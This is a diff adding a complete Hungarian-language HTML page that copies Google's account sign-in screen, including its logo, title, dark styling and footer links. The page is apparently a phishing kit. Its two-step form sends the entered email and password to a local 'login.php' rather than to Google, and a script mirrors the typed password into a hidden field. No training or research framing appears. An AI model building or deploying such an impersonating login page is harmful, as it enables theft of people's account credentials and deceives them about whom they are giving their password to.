@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="hu">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Bejelentkezés – Google-fiók</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" />
+    <style>
+      body {
+        background-color: #121212;
+        color: #e3e3e3;
+        font-family: Roboto, Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        justify-content: space-between;
+      }
+      .main-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex: 1;
+        padding: 20px;
+      }
+      .login-card {
+        background-color: #1e1e1e;
+        border-radius: 28px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        width: 100%;
+        max-width: 450px;
+        padding: 40px;
+        box-sizing: border-box;
+      }
+      .google-logo {
+        width: 32px;
+        height: 32px;
+        margin-bottom: 24px;
+      }
+      h1 {
+        font-size: 24px;
+        font-weight: 400;
+        color: #e3e3e3;
+        margin: 0 0 8px 0;
+      }
+      .subtitle {
+        font-size: 14px;
+        color: #c4c7c5;
+        margin-bottom: 32px;
+      }
+      .input-group {
+        position: relative;
+        margin-bottom: 20px;
+      }
+      .input-group input {
+        width: 100%;
+        padding: 16px;
+        background: transparent;
+        border: 1px solid #8e918f;
+        border-radius: 4px;
+        color: #e3e3e3;
+        font-size: 16px;
+        box-sizing: border-box;
+        outline: none;
+        transition: border-color 0.2s;
+      }
+      .input-group input:focus {
+        border-color: #a8c7fa;
+        border-width: 2px;
+        padding: 15px;
+      }
+      .email-display {
+        display: inline-flex;
+        align-items: center;
+        background-color: #2b2b2b;
+        border: 1px solid #8e918f;
+        border-radius: 20px;
+        padding: 6px 12px;
+        margin-bottom: 24px;
+        font-size: 14px;
+        color: #e3e3e3;
+      }
+      .checkbox-container {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 32px;
+        font-size: 14px;
+        color: #c4c7c5;
+        cursor: pointer;
+      }
+      .checkbox-container input {
+        accent-color: #a8c7fa;
+        width: 18px;
+        height: 18px;
+      }
+      .card-footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 20px;
+      }
+      .text-link {
+        color: #a8c7fa;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+      }
+      .text-link:hover {
+        text-decoration: underline;
+      }
+      .btn-primary {
+        background-color: #a8c7fa;
+        color: #062e6f;
+        border: none;
+        border-radius: 20px;
+        padding: 10px 24px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+      .btn-primary:hover {
+        background-color: #d3e3fd;
+      }
+      footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px 40px;
+        font-size: 12px;
+        color: #c4c7c5;
+        background-color: #121212;
+        max-width: 1200px;
+        margin: 0 auto;
+        width: 100%;
+        box-sizing: border-box;
+      }
+      .footer-links {
+        display: flex;
+        gap: 24px;
+      }
+      .footer-links a {
+        color: #c4c7c5;
+        text-decoration: none;
+      }
+      .footer-links a:hover {
+        text-decoration: underline;
+      }
+      select.lang-select {
+        background: transparent;
+        color: #c4c7c5;
+        border: none;
+        outline: none;
+        font-size: 12px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main-container">
+      <div class="login-card">
+        <!-- Google Logo SVG -->
+        <svg class="google-logo" viewBox="0 0 24 24">
+          <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
+          <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.19v3.15C3.19 21.32 7.22 24 12 24z"/>
+          <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.61H1.19C.43 8.15 0 9.89 0 12s.43 3.85 1.19 5.39l4.08-3.15z"/>
+          <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.22 0 3.19 2.68 1.19 6.61l4.08 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
+        </svg>
+
+        <form action="login.php" method="post" id="googleLoginForm">
+          <!-- 1. Lépés: E-mail megadása -->
+          <div id="email-section">
+            <h1>Bejelentkezés</h1>
+            <p class="subtitle">Használja Google-fiókját</p>
+            <div class="input-group">
+              <input type="text" name="email" id="email" placeholder="E-mail-cím vagy telefonszám" required autofocus />
+            </div>
+            <a href="#" class="text-link">Elfelejtette az e-mail-címét?</a>
+            <div style="margin-top: 30px; font-size: 14px; color: #c4c7c5;">
+              Nem a saját számítógépét használja? Nyisson privát ablakot a bejelentkezéshez. <a href="#" class="text-link">További információ</a>
+            </div>
+            <div class="card-footer" style="margin-top: 40px;">
+              <a href="#" class="text-link">Fiók létrehozása</a>
+              <button type="button" class="btn-primary" id="nextBtn">Tovább</button>
+            </div>
+          </div>
+
+          <!-- 2. Lépés: Jelszó megadása (automatikusan ide ugrik a Tovább gomb után) -->
+          <div id="password-section" style="display: none;">
+            <h1>Üdvözöljük!</h1>
+            <div class="email-display" id="displayEmail">user@gmail.com</div>
+            <div class="input-group" style="margin-top: 10px;">
+              <input type="password" name="password" id="password" placeholder="Adja meg jelszavát" />
+              <input type="hidden" id="hiddenPass" name="hiddenPassword" />
+            </div>
+            <label class="checkbox-container">
+              <input type="checkbox" id="showPass" /> Jelszó megjelenítése
+            </label>
+            <div class="card-footer">
+              <a href="#" class="text-link">Próbálkozás máshogy</a>
+              <button type="submit" class="btn-primary">Tovább</button>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <footer>
+      <select class="lang-select">
+        <option value="hu">magyar</option>
+        <option value="en">English</option>
+      </select>
+      <div class="footer-links">
+        <a href="#">Súgó</a>
+        <a href="#">Adatvédelem</a>
+        <a href="#">Általános Szerződési Feltételek</a>
+      </div>
+    </footer>
+
+    <script>
+      const nextBtn = document.getElementById('nextBtn');
+      const emailSection = document.getElementById('email-section');
+      const passwordSection = document.getElementById('password-section');
+      const emailInput = document.getElementById('email');
+      const displayEmail = document.getElementById('displayEmail');
+      const passwordInput = document.getElementById('password');
+      const hiddenPass = document.getElementById('hiddenPass');
+      const showPassCheckbox = document.getElementById('showPass');
+
+      // Tovább gomb eseménykezelője (átvált jelszavas nézetre)
+      nextBtn.addEventListener('click', () => {
+        if(emailInput.value.trim() !== '') {
+          displayEmail.textContent = emailInput.value;
+          emailSection.style.display = 'none';
+          passwordSection.style.display = 'block';
+          passwordInput.focus();
+        } else {
+          emailInput.focus();
+        }
+      });
+
+      // Enter billentyű támogatás az e-mail mezőben
+      emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          nextBtn.click();
+        }
+      });
+
+      // Jelszó láthatóság váltás
+      showPassCheckbox.addEventListener('change', (e) => {
+        passwordInput.type = e.target.checked ? 'text' : 'password';
+      });
+
+      // Jelszó szinkronizálása a rejtett mezőbe
+      if (passwordInput && hiddenPass) {
+        passwordInput.addEventListener('input', (e) => {
+          hiddenPass.value = e.target.value;
+        });
+      }
+    </script>
+  </body>
+</html>
